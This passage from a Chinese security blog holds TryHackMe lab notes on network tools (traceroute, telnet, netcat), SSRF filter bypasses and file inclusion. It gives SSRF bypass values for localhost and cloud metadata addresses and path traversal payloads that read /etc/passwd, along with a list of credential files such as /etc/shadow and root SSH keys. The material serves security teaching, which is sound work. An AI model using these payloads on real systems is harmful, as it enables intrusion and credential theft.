<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ traceroute tryhackme.com</span><br><span class="line">traceroute to tryhackme.com (104.26.11.229), 30 hops max, 60 byte packets</span><br><span class="line"> 1  ec2-79-125-1-9.eu-west-1.compute.amazonaws.com (79.125.1.9)  1.475 ms * ec2-3-248-240-31.eu-west-1.compute.amazonaws.com (3.248.240.31)  9.456 ms</span><br><span class="line"> 2  100.65.20.160 (100.65.20.160)  16.575 ms 100.66.8.226 (100.66.8.226)  23.241 ms 100.65.23.192 (100.65.23.192)  22.267 ms</span><br><span class="line"> 3  100.66.16.50 (100.66.16.50)  2.777 ms 100.66.11.34 (100.66.11.34)  22.288 ms 100.66.16.28 (100.66.16.28)  4.421 ms</span><br><span class="line"> 4  100.66.6.47 (100.66.6.47)  17.264 ms 100.66.7.161 (100.66.7.161)  39.562 ms 100.66.10.198 (100.66.10.198)  15.958 ms</span><br><span class="line"> 5  100.66.5.123 (100.66.5.123)  20.099 ms 100.66.7.239 (100.66.7.239)  19.253 ms 100.66.5.59 (100.66.5.59)  15.397 ms</span><br><span class="line"> 6  * 100.66.5.223 (100.66.5.223)  16.172 ms 100.65.15.135 (100.65.15.135)  0.424 ms</span><br><span class="line"> 7  100.65.12.135 (100.65.12.135)  0.390 ms 100.65.12.15 (100.65.12.15)  1.045 ms 100.65.14.15 (100.65.14.15)  1.036 ms</span><br><span class="line"> 8  100.100.4.16 (100.100.4.16)  0.482 ms 100.100.20.122 (100.100.20.122)  0.795 ms 100.95.2.143 (100.95.2.143)  0.827 ms</span><br><span class="line"> 9  100.100.20.86 (100.100.20.86)  0.442 ms 100.100.4.78 (100.100.4.78)  0.347 ms 100.100.20.20 (100.100.20.20)  1.388 ms</span><br><span class="line">10  100.92.212.20 (100.92.212.20)  11.611 ms 100.92.11.54 (100.92.11.54)  12.675 ms 100.92.11.56 (100.92.11.56)  10.835 ms</span><br><span class="line">11  100.92.6.52 (100.92.6.52)  11.427 ms 100.92.6.50 (100.92.6.50)  11.033 ms 100.92.210.50 (100.92.210.50)  10.551 ms</span><br><span class="line">12  100.92.210.139 (100.92.210.139)  10.026 ms 100.92.6.13 (100.92.6.13)  14.586 ms 100.92.210.69 (100.92.210.69)  12.032 ms</span><br><span class="line">13  100.92.79.12 (100.92.79.12)  12.011 ms 100.92.79.68 (100.92.79.68)  11.318 ms 100.92.80.84 (100.92.80.84)  10.496 ms</span><br><span class="line">14  100.92.9.27 (100.92.9.27)  11.354 ms 100.92.80.31 (100.92.80.31)  13.000 ms 52.93.135.125 (52.93.135.125)  11.412 ms</span><br><span class="line">15  150.222.241.85 (150.222.241.85)  9.660 ms 52.93.135.81 (52.93.135.81)  10.941 ms 150.222.241.87 (150.222.241.87)  16.543 ms</span><br><span class="line">16  100.92.228.102 (100.92.228.102)  15.168 ms 100.92.227.41 (100.92.227.41)  10.134 ms 100.92.227.52 (100.92.227.52)  11.756 ms</span><br><span class="line">17  100.92.232.111 (100.92.232.111)  10.589 ms 100.92.231.69 (100.92.231.69)  16.664 ms 100.92.232.37 (100.92.232.37)  13.089 ms</span><br><span class="line">18  100.91.205.140 (100.91.205.140)  11.551 ms 100.91.201.62 (100.91.201.62)  10.246 ms 100.91.201.36 (100.91.201.36)  11.368 ms</span><br><span class="line">19  100.91.205.79 (100.91.205.79)  11.112 ms 100.91.205.83 (100.91.205.83)  11.040 ms 100.91.205.33 (100.91.205.33)  10.114 ms</span><br><span class="line">20  100.91.211.45 (100.91.211.45)  9.486 ms 100.91.211.79 (100.91.211.79)  13.693 ms 100.91.211.47 (100.91.211.47)  13.619 ms</span><br><span class="line">21  100.100.6.81 (100.100.6.81)  11.522 ms 100.100.68.70 (100.100.68.70)  10.181 ms 100.100.6.21 (100.100.6.21)  11.687 ms</span><br><span class="line">22  100.100.65.131 (100.100.65.131)  10.371 ms 100.100.92.6 (100.100.92.6)  10.939 ms 100.100.65.70 (100.100.65.70)  23.703 ms</span><br><span class="line">23  100.100.2.74 (100.100.2.74)  15.317 ms 100.100.66.17 (100.100.66.17)  11.492 ms 100.100.88.67 (100.100.88.67)  35.312 ms</span><br><span class="line">24  100.100.16.16 (100.100.16.16)  19.155 ms 100.100.16.28 (100.100.16.28)  19.147 ms 100.100.2.68 (100.100.2.68)  13.718 ms</span><br><span class="line">25  99.83.89.19 (99.83.89.19)  28.929 ms *  21.790 ms</span><br><span class="line">26  104.26.11.229 (104.26.11.229)  11.070 ms  11.058 ms  11.982 ms</span><br></pre></td></tr></tbody></table></figure>
<p>在 traceroute
程序的第二次运行中，我们注意到这次数据包采用了更长的路由，通过了26个路由器。如果你运行
traceroute
追踪你所在网络中某个系统的路由，则该路由不太可能发生更改。然而，当数据包需要通过我们网络之外的其他路由器时，我们不能指望路由保持不变。</p>
<p>总而言之，我们可以注意到以下几点:</p>
<ul>
<li>系统和目标系统之间的跳/路由器的数量取决于你运行 traceroute
的时间。不能保证你的数据包总是遵循相同的路由，即使你在相同的网络上，或者你在很短的时间内重复
traceroute 命令。</li>
<li>一些路由器返回公共 IP
地址。你可以根据预期渗透测试的范围来检查其中的一些路由器。</li>
<li>一些路由器不会回复。</li>
</ul>
<h2 id="telnet">Telnet</h2>
<p>TELNET（Teletype
Network）协议于1969年开发，通过命令行界面（CLI）与远程系统通信。因此，命令<code>telnet</code>使用
TELNET 协议进行远程管理。Telnet 使用的默认端口是 23
。从安全角度来看，<code>telnet</code>以明文形式发送所有数据，包括用户名和密码。通过明文发送，任何人都可以很容易地访问通信信道，从而窃取登录凭据。安全的替代方案是
SSH(Secure SHell) 协议。</p>
<p>然而，telnet 客户端由于其简单性，可以用于其他目的。由于 telnet
客户端依赖于 TCP 协议，你可以使用 Telnet 连接到任何服务并获取其 banner
。使用 <code>telnet 10.10.120.159 PORT</code>，你可以连接到在 TCP
上运行的任何服务，甚至可以交换一些消息，除非它使用加密。</p>
<p>假设我们希望发现关于 web 服务器的更多信息，监听端口 80 。我们在 80
端口连接到服务器，然后使用 HTTP 协议进行通信。你不需要深入研究 HTTP
协议; 你只需要<strong>发出</strong>
<code>GET / HTTP/1.1</code>。要指定默认索引页之外的其他内容，可以发出
<code>GET /page.html HTTP/1.1</code>请求，它将请求
<code>page.html</code>。我们还向远程 Web 服务器指定希望使用 HTTP
版本1.1进行通信。要获得有效的响应，你需要为主机输入一些值（<code>host: example</code>
），然后<strong>按回车键两次</strong>。执行这些步骤将提供所请求的索引页。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ telnet 10.10.120.159 80</span><br><span class="line">Trying 10.10.120.159...</span><br><span class="line">Connected to MACHINE_IP.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">host: telnet</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Tue, 17 Aug 2021 11:13:25 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 867</span><br><span class="line">Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"611b9990-363"</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>
<p>我们发现了已安装的 Web 服务器
的类型和版本：<code>Server: nginx/1.6.2</code>。在本例中，我们与 Web
服务器进行通信，因此使用了基本的 HTTP
命令。如果连接到邮件服务器，则需要使用基于协议的正确命令，如 SMTP 和
POP3 。</p>
<h2 id="netcat">Netcat</h2>
<p>Netcat（<code>nc</code>）对于渗透测试具有很高的价值。Netcat支持 TCP
和 UDP
协议。它可以充当连接到侦听端口的客户端；或者，它可以充当侦听(你选择的)端口的服务器。</p>
<p>首先，与 Telnet
的使用方法类似，你可以使用<code>nc MACHINE_IP PORT</code>来获取 banner
信息，需要注意的是，你可能需要在 GET 行之后按 SHIFT + ENTER 。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ nc 10.10.221.57 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">host: netcat</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Tue, 17 Aug 2021 11:39:49 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 867</span><br><span class="line">Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"611b9990-363"</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>
<p>在上面所示的终端中，我们使用 <code>nc 10.10.221.57 80</code> 连接到
10.10.221.57 端口 80 。接下来，我们使用
<code>GET / HTTP/1.1</code>为默认页面发出 GET
请求；我们向目标服务器指定客户端支持 HTTP
版本1.1。最后，我们需要为主机命名，因此我们添加了一个新行
<code>host: netcat</code>
；你可以为主机命名任何名称，因为这对本练习没有影响。</p>
<p>根据输出 <code>Server: nginx/1.6.2</code>
，我们可以得知：在目标计算机的端口 80 上，1.6.2版本的 Nginx
正在监听传入的连接。</p>
<p>你还可以使用 netcat 监听 TCP
端口并连接到另一个系统上的监听端口。在服务器系统上，你要打开端口并监听它，你可以使用
<code>nc -lp 1234</code> 或更好的 <code>nc -vnlp 1234</code> ，它相当于
<code>nc -v -l -n -p 1234</code>
，只要端口号前面有<code>-p</code>参数，字母的确切顺序就无关紧要。</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">option</th>
<th style="text-align: center;">meaning</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">-l</td>
<td style="text-align: center;">Listen mode</td>
</tr>
<tr class="even">
<td style="text-align: center;">-p</td>
<td style="text-align: center;">Specify the Port number</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-n</td>
<td style="text-align: center;">Numeric only; no resolution of hostnames
via DNS</td>
</tr>
<tr class="even">
<td style="text-align: center;">-v</td>
<td style="text-align: center;">Verbose output (optional, yet useful to
discover any bugs)</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-vv</td>
<td style="text-align: center;">Very Verbose (optional)</td>
</tr>
<tr class="even">
<td style="text-align: center;">-k</td>
<td style="text-align: center;">Keep listening after client
disconnects</td>
</tr>
</tbody>
</table>
<p>注意：</p>
<ul>
<li><code>-p</code>选项应该出现在你要监听的端口号之前。</li>
<li><code>-n</code>选项将避免 DNS 查找和警告。</li>
<li>小于 1024 的端口号需要 root 权限才能监听。</li>
</ul>
<p>在客户端，你将使用<code>nc 10.10.221.57 PORT_NUMBER</code>。这是使用<code>nc</code>进行回显的例子：成功建立与服务器的连接后，无论你在客户端输入什么，服务器端都会响应，反之亦然。</p>
<h2 id="总结">总结</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Command</th>
<th style="text-align: center;">Example</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">ping</td>
<td style="text-align: center;"><code>ping -c 10 10.10.221.57</code> on
Linux or macOS</td>
</tr>
<tr class="even">
<td style="text-align: center;">ping</td>
<td style="text-align: center;"><code>ping -n 10 10.10.221.57</code> on
MS Windows</td>
</tr>
<tr class="odd">
<td style="text-align: center;">traceroute</td>
<td style="text-align: center;"><code>traceroute 10.10.221.57</code> on
Linux or macOS</td>
</tr>
<tr class="even">
<td style="text-align: center;">tracert</td>
<td style="text-align: center;"><code>tracert 10.10.221.57</code> on MS
Windows</td>
</tr>
<tr class="odd">
<td style="text-align: center;">telnet</td>
<td style="text-align: center;"><code>telnet 10.10.221.57 PORT_NUMBER</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">netcat as client</td>
<td style="text-align: center;"><code>nc 10.10.221.57 PORT_NUMBER</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">netcat as server</td>
<td style="text-align: center;"><code>nc -lvnp PORT_NUMBER</code></td>
</tr>
</tbody>
</table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/04/SSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/04/SSRF/" class="post-title-link" itemprop="url">SSRF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-01-04 10:48:08" itemprop="dateCreated datePublished" datetime="2023-01-04T10:48:08+08:00">2023-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 16:01:28" itemprop="dateModified" datetime="2023-06-10T16:01:28+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/ssrfqi</p>
<p>参考https://www.cnblogs.com/Hekeats-L/p/16919147.html</p>
<h2 id="introduction">Introduction</h2>
<h3 id="what-is-an-ssrf">What is an SSRF</h3>
<p>SSRF 是 服务端请求伪造（Server-Side Request
Forgery）的缩写。这个漏洞使得恶意用户能够使web服务器向该恶意用户选择的资源提出额外的HTTP请求。攻击者通过滥用服务器功能来访问或操作无法被直接访问的信息。</p>
<h3 id="types-of-ssrf">Types of SSRF</h3>
<ol type="1">
<li>第一种是常规类型的 SSRF，数据会返回给攻击者</li>
<li>第二种是 <strong>Blind SSRF</strong>
，攻击者无法看见相关信息和数据</li>
</ol>
<h3 id="whats-the-impact">What's the impact</h3>
<p>SSRF攻击可能会导致以下情况的发生：</p>
<ul>
<li>能够访问未经授权的区域</li>
<li>能够访问客户/组织的数据</li>
<li>能够进入内网</li>
<li>泄露身份验证令牌/凭证</li>
</ul>
<h2 id="finding-an-ssrf">Finding an SSRF</h2>
<p>潜在的SSRF漏洞可以通过多种方式在web应用程序中发现，下面是四个常见的示例：</p>
<ol type="1">
<li><p>地址栏中的参数使用完整的 URL：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111655039.png" alt="image-20230104111655039">
<figcaption aria-hidden="true">image-20230104111655039</figcaption>
</figure></li>
<li><p>表单中的<strong>隐藏</strong>字段：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111818606.png" alt="image-20230104111818606">
<figcaption aria-hidden="true">image-20230104111818606</figcaption>
</figure></li>
<li><p>地址栏中的参数使用部分 URL 例如主机名：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111932658.png" alt="image-20230104111932658">
<figcaption aria-hidden="true">image-20230104111932658</figcaption>
</figure></li>
<li><p>只包含路径的 URL：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104112014478.png" alt="image-20230104112014478">
<figcaption aria-hidden="true">image-20230104112014478</figcaption>
</figure></li>
</ol>
<p>上述示例是一些比较容易利用的漏洞，这些位置都是经过大量反复实验得到的。</p>
<p>如果是 <strong>Blind SSRF</strong>
，则不会有输出反馈，这时需要用到外部 HTTP
记录工具来监视请求，例如：网站https://requestbin.com/，你自己的
HTTP服务器，以及 Burp Suite 的 Collaborator 客户端。</p>
<h2 id="defeating-common-ssrf-defenses绕过ssrf防御">Defeating Common
SSRF Defenses（绕过SSRF防御）</h2>
<p>安全意识更高的开发人员会在其应用程序中添加 SSRF
的漏洞检测，通常有两种方式：建立拒绝列表（deny
list）；建立允许列表（allow list）。</p>
<h3 id="deny-list">Deny LIst</h3>
<p>拒绝列表是指除了列表中指定的资源与特定模式匹配的资源外，其他所有请求均接受。Web应用程序可以使用拒绝列表来保护敏感的端点、IP地址或域名不被公众访问，同时允许访问其他公开的资源。限制访问的特定端点是
<strong>localhost</strong>
，它可能包含服务器性能数据或一些敏感信息，因此
<strong>localhost</strong>、<strong>127.0.0.1</strong>
等域名可能会被记录在拒绝列表中。攻击者可以使用一些替代性的字符串表示
<strong>localhost</strong>
，例如：<code>0</code>，<code>0.0.0.0</code>，<code>0000</code>，<code>127.1</code>，<code>127.*.*.*</code>，<code>2130706433</code>，<code>017700000001</code>，或具有解析为<code>127.0.0.1</code>的
DNS 记录的子域名，例如<code>127.0.0.1.nip.io</code>。</p>
<p>此外，在云环境中，阻止对IP地址<code>169.254.169.254</code>的访问十分重要，该访问包含用于已部署的云服务器的元数据，元数据中可能包含敏感信息。攻击者可在自己的域上注册一个子域来绕过检验，该子域的DNS记录指向IP地址<code>169.254.169.254</code>。</p>
<h3 id="allow-list">Allow List</h3>
<p>除了出现在允许列表中的资源以及与特定模式匹配的资源外，其他所有的请求均不接受。例如参数中的
URL
必须以<code>https://website.thm</code>作为开头。攻击者可以通过在自己的域上注册子域(例如：<code>https://website.thm.attackers-domain.thm</code>)来绕过检验。应用程序逻辑上允许该子域输入并允许攻击者控制内部HTTP请求。</p>
<h3 id="open-redirect开放重定向">Open Redirect（开放重定向）</h3>
<p>如果上述方法均不起作用，攻击者还可以使用<strong>开放重定向</strong>这一技巧。开放重定向是服务器上的一个端点，网站访问者会被自动定向到另一个网址。以链接<code>https://website.thm/link?url=https://tryhackme.com</code>为例，创建此端点是为了记录访问者单击此链接的次数。但是如果该网站具有严格的规则，仅允许
URL
以<code>https://website.thm/</code>作为开头，那么可能存在一个潜在的SSRF漏洞，攻击者可以尝试将目标服务器的内部HTTP请求重定向到攻击者输入的域。</p>
<p>SSRF示例详见https://www.cnblogs.com/Hekeats-L/p/16919147.html</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">File inclusion(文件包含)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-01-01 17:56:14" itemprop="dateCreated datePublished" datetime="2023-01-01T17:56:14+08:00">2023-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 15:49:08" itemprop="dateModified" datetime="2023-06-10T15:49:08+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/fileinc</p>
<p>本文参考：https://www.cnblogs.com/Hekeats-L/p/16904866.html</p>
<h2 id="introduction">Introduction</h2>
<h3 id="what-is-file-inclusion">What is File inclusion</h3>
<p>文件包含漏洞包括本地文件包含(Local File
Inclusion，LFI)，远程文件包含(Remote File
Inclusion，RFI)和目录遍历(directory traversal)。</p>
<p>在某些场景中，编写web应用程序是为了用户能够通过参数请求访问给定系统的文件，包括图像、静态文本等。参数是附加到
URL 上的查询参数字符串，可用于用户输入检索数据或执行操作。下图展示了 URL
的基本组成部分。（注：<code>?</code>不属于 query string 的一部分）</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101142447372.png" alt="image-20230101142447372">
<figcaption aria-hidden="true">image-20230101142447372</figcaption>
</figure>
<p>下面讨论一个例子，用户请求访问web服务器的文件。首先用户将HTTP请求发送到对应的web服务器以显示请求中包含的文件，假设用户想要访问并在页面显示文件内容，请求可能如下：<code>http://webapp.thm/get.php?file=userCV.pdf</code>，其中<code>file</code>是参数，<code>userCV.pdf</code>是用户请求访问的文件名。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101150112981.png" alt="image-20230101150112981">
<figcaption aria-hidden="true">image-20230101150112981</figcaption>
</figure>
<h3 id="why-do-file-inclusion-vulnerabilities-happen">Why do File
inclusion vulnerabilities happen？</h3>
<p>文件包含漏洞通常在web应用程序的各种编程语言中被发现和利用，例如编写以及实现得较差的
<strong>PHP</strong> 程序。这些漏洞的主要问题在于输入验证(input
validation)，用户的输入未经排查或验证从而使得用户控制它们。</p>
<h3 id="what-is-the-risk-of-file-inclusion">What is the risk of File
inclusion？</h3>
<p>文件包含的风险取决于攻击者是否可以利用文件包含漏洞读取敏感数据。成功的攻击会导致敏感数据的泄露，包括web应用程序的代码和文件，以及后端系统的凭证。此外，如果攻击者能够以某种方式对服务器的文件进行写入，例如<code>/tmp</code>目录，那么就有可能导致远程命令执行（RCE）漏洞。然而，当文件包含漏洞无法获取敏感数据并且无法对服务器进行写入时，该漏洞就不会有效。</p>
<h2 id="path-traversal路径遍历">Path Traversal（路径遍历）</h2>
<p>也称为 <strong>Directory
traversal</strong>（目录遍历），该漏洞允许攻击者读取操作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过操纵和滥用web应用程序的URL来定位和访问存储在应用程序之外的文件或目录，从而实现对该漏洞的利用。</p>
<p>当用户的输入传递给PHP中的<code>file_get_contents</code>等函数时，会出现路径遍历漏洞。需要注意的是，函数并不是导致漏洞的主要因素。通常，输入验证或过滤不佳才是导致该漏洞的原因。在PHP中，您可以使用<code>file_get_contents</code>读取文件的内容。在<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.file-get-contents.php">这里</a>可以查看有关该函数的更多信息。</p>
<p>下面的图片展示了web应用程序如何存储文件及其文件结构。用户可通过路径<code>/var/www/app/CVs</code>请求访问<code>userCV.pdf</code>文件的内容。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101155922722.png" alt="image-20230101155922722">
<figcaption aria-hidden="true">image-20230101155922722</figcaption>
</figure>
<p>我们可以通过添加 <strong>payload</strong>
来查看web应用程序的行为用以测试URL参数。路径遍历攻击也称为<code>dot-dot-slash</code>攻击(<strong>../</strong>)，该攻击利用<code>../</code>将目录移动到<strong>上一级</strong>。如果攻击者找到了攻击点，在上图中是<code>get.php?file=</code>，<code>get.php</code>的路径为<code>/var/www/app/get.php</code>，然后攻击者可能发送如下内容：<code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>，通过<code>../</code>不断返回上一级直到根目录，再进入根目录下的<code>/etc</code>目录，找到<code>passwd</code>文件。因此web应用程序最终返回<code>passwd</code>的文件内容。</p>
<p>同样，如果web应用程序在Windows服务器上运行，攻击者需要提供Windows路径。例如，如果攻击者想要读取<code>c:\boot.ini</code>中的<code>boot.ini</code>文件，那么攻击者可以根据目标Windows系统版本尝试以下操作：</p>
<blockquote>
<p>http://webapp.thm/get.php?file=../../../../boot.ini</p>
<p>或</p>
<p>http://webapp.thm/get.php?file=../../../../windows/win.ini</p>
</blockquote>
<p>下面是测试时的一些常见的操作系统文件：</p>
<table>
<colgroup>
<col style="width: 31%">
<col style="width: 68%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;"><strong>Location</strong></th>
<th style="text-align: center;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">/etc/issue</td>
<td style="text-align: center;">contains a message or system
identification to be printed before the login prompt.</td>
</tr>
<tr class="even">
<td style="text-align: center;">/etc/profile</td>
<td style="text-align: center;">controls system-wide default variables,
such as Export variables, File creation mask (umask), Terminal types,
Mail messages to indicate when new mail has arrived</td>
</tr>
<tr class="odd">
<td style="text-align: center;">/proc/version</td>
<td style="text-align: center;">specifies the version of the Linux
kernel</td>
</tr>
<tr class="even">
<td style="text-align: center;">/etc/passwd</td>
<td style="text-align: center;">has all registered user that has access
to a system</td>
</tr>
<tr class="odd">
<td style="text-align: center;">/etc/shadow</td>
<td style="text-align: center;">contains information about the system's
users' passwords</td>
</tr>
<tr class="even">
<td style="text-align: center;">/root/.bash_history</td>
<td style="text-align: center;">contains the history commands for root
user</td>
</tr>
<tr class="odd">
<td style="text-align: center;">/var/log/dmessage</td>
<td style="text-align: center;">contains global system messages,
including the messages that are logged during system startup</td>
</tr>
<tr class="even">
<td style="text-align: center;">/var/mail/root</td>
<td style="text-align: center;">all emails for root user</td>
</tr>
<tr class="odd">
<td style="text-align: center;">/root/.ssh/id_rsa</td>
<td style="text-align: center;">Private SSH keys for a root or any known
valid user on the server</td>
</tr>
<tr class="even">
<td style="text-align: center;">/var/log/apache2/access.log</td>
<td style="text-align: center;">the accessed requests for Apache
webserver</td>
</tr>
<tr class="odd">
<td style="text-align: center;">C:.ini</td>
<td style="text-align: center;">contains the boot options for computers
with BIOS firmware</td>
</tr>
</tbody>
</table>
<h2 id="local-file-inclusionlfi">Local File Inclusion（LFI）</h2>
<p>针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。在使用
PHP 时，使用 <code>include</code>、 <code>request</code>、
<code>include _ once</code> 和 <code>request _ once</code>
等函数常常会导致 Web
应用程序易受攻击。在使用其他语言（如ASP、JSP，甚至Node.js）时也会出现LFI漏洞。LFI漏洞利用遵循与路径遍历相同的概念。</p>
<p>接下来将介绍不同的LFI场景。</p>
<ol type="1">
<li><p>假设web应用程序提供两种语言，用户可以在<code>EN</code>和<code>AR</code>之间进行选择。</p>
